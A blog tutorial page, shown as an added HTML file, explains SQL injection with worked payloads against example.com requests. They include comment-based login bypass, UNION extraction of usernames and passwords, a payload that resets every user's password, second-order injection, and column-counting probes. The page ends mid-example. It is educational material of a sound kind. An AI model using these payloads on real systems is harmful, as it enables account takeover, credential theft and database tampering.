@@ -1,0 +1,537 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>SQL Injection // 0xSlaxo Blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Abdelrhman Allam" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SQL Injection"/>
+<meta name="twitter:description" content="SQL is a programming language used to query or modify information stored within a database. A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement.
+This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database, and RCE in some cases."/>
+
+    <meta property="og:title" content="SQL Injection" />
+<meta property="og:description" content="SQL is a programming language used to query or modify information stored within a database. A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement.
+This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database, and RCE in some cases." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sl4x0.github.io/web-notes/sql-injection/" /><meta property="article:section" content="web-notes" />
+<meta property="article:published_time" content="2022-08-14T23:48:05+00:00" />
+<meta property="article:modified_time" content="2022-08-14T23:48:05+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
+      <h1>0xSlaxo Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p> M.A.C.S Student | N00b CTFer</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.facebook.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>My facebook</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>My Twitter</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">SQL Injection</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 14, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          21 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sl4x0.github.io/tags/sqli/">SQLi</a>
+              <a class="tag" href="https://sl4x0.github.io/tags/web-notes/">Web-Notes</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>SQL is a programming language used to <strong>query or modify</strong> information stored within a database. A SQL injection is an attack in
+which the attacker executes <strong>arbitrary SQL commands on an application’s database</strong> by supplying <strong>malicious input</strong> inserted into a SQL statement.</p>
+<p>This happens when the input used in SQL queries is <strong>incorrectly filtered or escaped</strong> and can lead to authentication <strong>bypass</strong>, sensitive data <strong>leaks</strong>, tampering of the database, and <strong>RCE</strong> in some cases.</p>
+<hr>
+<h1 id="references"><code>References</code></h1>
+<p><a href="https://www.youtube.com/watch?v=z9v4mB4-hMg">39 SQLmap - OSCP  Offensive Security Certified Professional</a></p>
+<p><a href="https://tryhackme.com/room/sqlmap">TryHackMe  SQLMAP</a></p>
+<p><a href="https://tryhackme.com/room/sqlinjectionlm">TryHackMe  SQL Injection</a></p>
+<p><a href="https://tryhackme.com/room/sqlilab">TryHackMe  SQL Injection Lab</a></p>
+<p><a href="https://www.hacksplaining.com/exercises/sql-injection">SQL Injection</a></p>
+<p><a href="https://application.security/free-application-security-training/owasp-top-10-sql-injection">SQL Injection  Kontra</a></p>
+<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet  Web Security Academy</a></p>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">SQL Injection</a></p>
+<p><a href="https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md">AllAboutBugBounty/NoSQL Injection.md at master · daffainfo/AllAboutBugBounty</a></p>
+<p><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/sqli.md">bugbounty-cheatsheet/sqli.md at master · EdOverflow/bugbounty-cheatsheet</a></p>
+<p><a href="https://github.com/KathanP19/HowToHunt/tree/master/SQLi">HowToHunt/SQLi at master · KathanP19/HowToHunt</a></p>
+<p><a href="https://github.com/alexbieber/Bug_Bounty_writeups#sql-injectionsqli">GitHub - alexbieber/Bug_Bounty_writeups: BUG BOUNTY WRITEUPS - OWASP TOP 10 🔴🔴🔴🔴✔</a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">PayloadsAllTheThings/SQL Injection at master · swisskyrepo/PayloadsAllTheThings</a></p>
+<p><a href="https://github.com/ngalongc/bug-bounty-reference#sql-injection">GitHub - ngalongc/bug-bounty-reference: Inspired by https://github.com/djadmin/awesome-bug-bounty, a list of bug bounty write-up that is categorized by the bug nature</a></p>
+<p><a href="https://github.com/vavkamil/awesome-bugbounty-tools#SQL-Injection">GitHub - vavkamil/awesome-bugbounty-tools: A curated list of various bug bounty tools</a></p>
+<p><a href="https://pastebin.com/W4EMGNDc">SQL Injection - Pastebin.com</a></p>
+<p><a href="https://github.com/codingo/NoSQLMap/">https://github.com/codingo/NoSQLMap/</a></p>
+<p><a href="https://github.com/Z4nzu/hackingtool?fbclid=IwAR33ScGiX4ali_E2xscfctele2Oj3N07Pvh1l1pb1WlB3IHicnnXMyqogd8#sql-injection-tools">GitHub - Z4nzu/hackingtool: ALL IN ONE Hacking Tool For Hackers</a></p>
+<p><a href="https://attackdefense.com/listingnoauth?labtype=webapp-owasp-top10&amp;subtype=webapp-owasp-top10-injection">Dashboard</a></p>
+<p><a href="https://github.com/riramar/Web-Attack-Cheat-Sheet#SQLi-Scanning">GitHub - riramar/Web-Attack-Cheat-Sheet: Web Attack Cheat Sheet</a></p>
+<p><a href="https://github.com/Voorivex/pentest-guide/tree/master/SQL-Injection">pentest-guide/SQL-Injection at master · Voorivex/pentest-guide</a></p>
+<p><a href="https://rails-sqli.org/">Rails SQL Injection Examples</a></p>
+<p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<p><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">SQL Injection Cheat Sheet Invicti</a></p>
+<p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<p><a href="https://github.com/0xL1mb0/Web-CTF-Cheatsheet#sql-injection">GitHub - 0xL1mb0/Web-CTF-Cheatsheet: Web CTF CheatSheet 🐈</a></p>
+<p><a href="https://github.com/daffainfo/AllAboutBugBounty/blob/master/SQL%20Injection.md">AllAboutBugBounty/SQL Injection.md at master · daffainfo/AllAboutBugBounty</a></p>
+<p><a href="https://nored0x.github.io/penetration%20testing/writeups-Bug-Bounty-hackrone/#sql">Writeups Bug Bounty hackerone</a></p>
+<hr>
+<h1 id="mechanisms"><code>Mechanisms</code></h1>
+<p><img src="https://user-images.githubusercontent.com/70459751/184544962-1d51e6f9-a99e-4913-a8ec-ca0b90e0d372.png" alt="image"></p>
+<p>To understand <strong>SQL injections</strong>, let’s start by understanding what SQL is. It’s a language to <strong>manage</strong> and <strong>communicate</strong> with databases.</p>
+<p>Traditionally, a database contains <strong>tables</strong>, <strong>rows</strong>, <strong>columns</strong>, and <strong>fields</strong>. The rows and columns contain the data, which gets stored in <strong>single fields</strong>.
+<img src="https://user-images.githubusercontent.com/70459751/184544972-49cbc8d9-797c-42c1-8bf2-cc298bc3e377.png" alt="image"></p>
+<p>This table contains <strong>three columns</strong>: ID, Username, and Password. It also contains <strong>three rows</strong> of data, each storing the credentials of a different user.</p>
+<p>SQL SELECT statements can be used to <strong>retrieve data from the database</strong>. The following query will return the <strong>entire Users table</strong> from the database:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> Users;
+</span></span></code></pre></div><p>This query would return <strong>all usernames</strong> in the Users table:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Username <span style="color:#66d9ef">FROM</span> Users;
+</span></span></code></pre></div><p>Finally, this query would return all users with the username <strong>admin</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> Users <span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>;
+</span></span></code></pre></div><p>For more examples: <a href="https://www.w3schools.com/sql/default.asp">SQL Tutorial (w3schools.com)</a></p>
+<hr>
+<h1 id="injecting-code-into-sql-queries"><code>Injecting Code into SQL Queries</code></h1>
+<p>A <strong>SQL injection attack</strong> occurs when an attacker is able to inject code into the <strong>SQL statements</strong> that the <strong>target</strong> web application</p>
+<p>For example, let’s say that a website prompts its users for <strong>their username and password</strong>, then inserts these into a <strong>SQL query</strong> to log in the user. The following POST request parameters from the user will be used to <strong>populate a SQL query</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>POST <span style="color:#f92672">/</span>login
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>(POST request body)
+</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span>vickie<span style="color:#f92672">&amp;</span>password<span style="color:#f92672">=</span>password123
+</span></span></code></pre></div><p>This SQL query will find the <strong>ID of a user</strong> that matches the username and password provided in the POST request. The application will then log in to that <strong>user’s account</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Id <span style="color:#66d9ef">FROM</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vickie&#39;</span> <span style="color:#66d9ef">AND</span> Password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password123&#39;</span>;
+</span></span></code></pre></div><p>The attacker can inject a special character to SQL to mess with the query like this :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>POST <span style="color:#f92672">/</span>login
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>(POST request body)
+</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#39;;-- &#34;</span><span style="color:#f92672">&amp;</span>password<span style="color:#f92672">=</span>password123
+</span></span></code></pre></div><p>the generated SQL query would become this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Id <span style="color:#66d9ef">FROM</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>;<span style="color:#75715e">-- &#39; AND Password=&#39;password123&#39;;
+</span></span></span></code></pre></div><p>The query becomes this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Id <span style="color:#66d9ef">FROM</span> Users <span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>; <span style="color:#f92672">//</span><span style="color:#66d9ef">As</span> the <span style="color:#66d9ef">last</span> <span style="color:#66d9ef">statement</span> become a <span style="color:#66d9ef">comment</span>.
+</span></span></code></pre></div><p>By injecting special characters into the SQL query, the attacker <strong>bypassed authentication</strong> and can log in as the admin without knowing the <strong>correct password</strong>!</p>
+<p>.</p>
+<p>.</p>
+<p>Attackers might also be able to <strong>retrieve data they shouldn’t be allowed to access</strong>. Let’s say a website allows users to access a list of their emails by providing the server with a <strong>username</strong> and an access <strong>key</strong> to prove their identity:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">GET</span> <span style="color:#f92672">/</span>emails<span style="color:#f92672">?</span>username<span style="color:#f92672">=</span>vickie<span style="color:#f92672">&amp;</span>accesskey<span style="color:#f92672">=</span>ZB6w0YLjzvAVmp6zvr
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span></code></pre></div><p>This GET request might generate a query to the database with the following SQL statement:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Title, Body <span style="color:#66d9ef">FROM</span> Emails
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vickie&#39;</span> <span style="color:#66d9ef">AND</span> AccessKey<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ZB6w0YLjzvAVmp6zvr&#39;</span>;
+</span></span></code></pre></div><p>In this case, attackers can use the SQL query to <strong>read data from other tables that they should not be able to read</strong>. For instance, imagine they sent the following HTTP request to the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">GET</span> <span style="color:#f92672">/</span>emails<span style="color:#f92672">?</span>username<span style="color:#f92672">=</span>vickie<span style="color:#f92672">&amp;</span>accesskey<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ZB6w0YLjzvAVmp6zvr&#39; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">UNION SELECT Username, Password FROM Users;-- &#34;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span></code></pre></div><p>The server would turn the original SQL query into this one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Title, Body <span style="color:#66d9ef">FROM</span> Emails
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vickie&#39;</span> <span style="color:#66d9ef">AND</span> AccessKey<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ZB6w0YLjzvAVmp6zvr&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">UNION</span> <span style="color:#ae81ff">3</span><span style="color:#66d9ef">SELECT</span> Username, Password <span style="color:#66d9ef">FROM</span> Users;<span style="color:#ae81ff">4</span><span style="color:#75715e">-- ;
+</span></span></span></code></pre></div><p>The SQL <strong>UNION 2</strong> operator <strong>combines</strong> the results of two different <strong>SELECT statements</strong>. Therefore, this query combines the results of the first SELECT
+statement 1, which returns a <strong>user’s emails</strong>, and the second SELECT statement 3, which, as described earlier, <strong>returns all usernames and passwords</strong> from the Users table.</p>
+<p>.</p>
+<p>.</p>
+<p>For example, let’s say that this is the HTTP POST request used to <strong>update a user’s password</strong> on the target website:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>POST <span style="color:#f92672">/</span>change_password
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>(POST request body)
+</span></span><span style="display:flex;"><span>new_password<span style="color:#f92672">=</span>password12345
+</span></span></code></pre></div><p>The website would form an <strong>UPDATE query</strong> with your <strong>new password</strong> and the <strong>ID</strong> of the currently logged-in user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">UPDATE</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SET</span> Password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password12345&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Id <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+</span></span></code></pre></div><p>In this case, attackers can control the SET clause of the statement, which is used to specify <strong>which rows should be updated in a table</strong>. The attacker can construct a POST request like this one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>POST <span style="color:#f92672">/</span>change_password
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>(POST request body)
+</span></span><span style="display:flex;"><span>new_password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password12345&#39;;--&#34;</span>
+</span></span></code></pre></div><p>This request generates the following SQL query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">UPDATE</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SET</span> Password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password12345&#39;</span>;<span style="color:#75715e">-- WHERE Id = 2;
+</span></span></span></code></pre></div><p>The database would update all rows in the table, and change <strong>all of the passwords in the Users table to password12345</strong>. The attacker can now log in as anyone by using that password.</p>
+<hr>
+<h1 id="using-second-order-sql-injections-stored-sql-injection"><code>Using Second-Order SQL Injections [stored SQL injection]</code></h1>
+<p>First-order SQL injections happen when <strong>applications use user-submitted input directly in a SQL query</strong>. On the other hand, second-order SQL injections happen when <strong>user input gets stored into a database</strong>, then retrieved and used
+unsafely in a SQL query. Even if applications <strong>handle input properly when it’s submitted by the user, these vulnerabilities can occur if the application mistakenly treats the data as safe</strong> when it’s retrieved from the database.</p>
+<p><img src="https://user-images.githubusercontent.com/70459751/184544991-9f06bbb7-f008-48ff-8957-ea7958d82465.png" alt="image"></p>
+<p>For example, consider a web application that <strong>allows users to create an account by specifying a username and a password</strong>. Let’s say that a malicious user submits the following request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>POST <span style="color:#f92672">/</span>signup
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>(POST request body)
+</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vickie&#39; UNION SELECT Username, Password FROM Users;-- 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&amp;</span>password<span style="color:#f92672">=</span>password123
+</span></span></code></pre></div><p>This request submits the username vickie&rsquo; <strong>UNION</strong> SELECT Username, Password FROM Users;&ndash; and the password password123 to the /signup endpoint.</p>
+<p>The username <strong>POST request parameter</strong> contains a SQL injection payload that would <strong>SELECT all usernames and passwords and concatenate them to the
+results of the database query</strong>.</p>
+<p>And the string vickie&rsquo; UNION SELECT Username, Password FROM Users;&ndash; is <strong>stored into the application’s database as the attacker’s username</strong>. Later, the malicious user accesses their email with the following GET request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">GET</span> <span style="color:#f92672">/</span>emails
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span></code></pre></div><hr>
+<h1 id="sql-injection-union-attacks"><code>SQL injection UNION attacks</code></h1>
+<p>The <code>UNION</code>keyword lets you execute one or more additional <code>SELECT</code>queries and append the results to the original query. For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> a, b <span style="color:#66d9ef">FROM</span> table1 <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">c</span>, d <span style="color:#66d9ef">FROM</span> table2
+</span></span></code></pre></div><p>For a <code>UNION</code> query to work, two key requirements must be met:</p>
+<ul>
+<li>The individual queries must return the <strong>same number of columns</strong>.</li>
+<li>The data types in each column must be compatible between the individual queries.</li>
+</ul>
+<p>.</p>
+<p>.</p>
+<p><strong><strong>Determining the number of columns required in an SQL injection UNION attack</strong></strong></p>
+<p>The first method involves injecting a series of <code>ORDER BY</code>clauses and incrementing the specified column index until an error occurs.</p>
+<p>For example, assuming the injection point is a quoted string within the <code>WHERE</code>clause of the original query, you would submit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; ORDER BY 1--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#ae81ff">2</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39; ORDER BY 3--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">etc.
+</span></span></span></code></pre></div><p>This series of payloads <strong>modifies the original query to order the results by different columns in the result set</strong>. The column in an <code>ORDER BY</code>clause can be specified by its index, so you don&rsquo;t need to know the names of any columns.</p>
+<p>the database returns an error, such as:<code>The ORDER BY position number 3 is out of range of the number of items in the select list.</code></p>
+<p>The application might actually return the <strong>database error in its HTTP response</strong>, or it might return a <strong>generic error</strong>, or simply return <strong>no results</strong>. Provided you can detect some difference in the <strong>application&rsquo;s response</strong>, you can infer how many columns are being returned from the query.</p>
+<p>The second method involves submitting a series of <code>UNION SELECT</code>payloads specifying a different number of null values:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#66d9ef">NULL</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULL,NULL-- //using NULL maximizes the chance that the payload will succeed when the column count is correct.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">etc.
+</span></span></span></code></pre></div><p>If the number of nulls does not match the number of columns, the database returns an error, such as: <code>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</code></p>
+<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">Lab: SQL injection UNION attack, determining the number of columns returned by the query Web Security Academy</a></p>
+<p>.</p>
+<p>.</p>
+<p><strong>Finding columns with a useful data type in an SQL injection UNION attack</strong></p>
+<p>Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of <code>UNION SELECT</code>
+payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39;,NULL,NULL,NULL--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#66d9ef">NULL</span>,<span style="color:#66d9ef">NULL</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULL,&#39;</span>a<span style="color:#e6db74">&#39;,NULL--
